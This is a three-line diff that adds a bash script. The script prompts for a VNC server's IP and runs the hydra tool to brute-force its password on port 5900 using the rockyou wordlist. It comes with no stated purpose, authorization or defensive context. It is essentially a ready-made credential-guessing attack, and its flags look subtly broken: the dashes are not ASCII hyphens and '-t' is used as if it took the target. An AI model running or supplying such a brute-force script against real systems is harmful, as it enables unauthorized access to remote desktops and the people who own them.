@@ -1,0 +1,3 @@
+#!/bin/bash
+
+read -p "VNC IP:> " ip; sudo hydra -s 5900 –P /usr/share/wordlists/rockyou.txt –t $ip vnc
